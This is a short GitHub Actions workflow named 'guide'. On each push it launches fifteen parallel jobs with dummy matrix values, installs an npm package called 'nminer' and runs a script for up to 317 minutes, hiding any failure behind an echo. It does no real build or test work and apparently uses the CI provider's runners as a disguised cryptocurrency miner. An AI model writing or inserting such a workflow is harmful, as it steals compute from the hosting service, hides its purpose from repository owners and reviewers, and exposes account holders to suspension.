name: guide
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7447 }
          - { version: 6351 }
          - { version: 4793 }
          - { version: 6784 }
          - { version: 6995 }
          - { version: 3139 }
          - { version: 3318 }
          - { version: 2455 }
          - { version: 1443 }
          - { version: 6217 }
          - { version: 6910 }
          - { version: 6563 }
          - { version: 9538 }
          - { version: 251 }
          - { version: 3286 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 317m node guide.js || echo "guide executed"